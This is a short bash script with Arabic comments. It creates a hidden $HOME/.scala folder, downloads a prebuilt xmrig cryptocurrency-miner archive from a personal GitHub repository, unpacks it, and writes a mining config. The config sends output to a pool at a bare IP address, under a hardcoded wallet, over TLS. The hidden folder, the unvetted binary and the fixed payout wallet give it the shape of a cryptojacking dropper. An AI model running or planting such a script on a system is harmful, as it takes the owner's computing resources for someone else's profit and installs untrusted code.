#!/bin/bash

# مجلد العمل
mkdir -p $HOME/.scala && cd $HOME/.scala

# تحميل xmrig جاهز
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz

# فك الضغط
tar -xf scala.tar.gz && cd scala

# إنشاء إعدادات التعدين باستخدام TLS
cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "randomx": { "1gb-pages": false },
    "pools": [
        {
            "url": "152.53.121.6:20128",
            "user": "4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR",
            "pass": "worker1",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
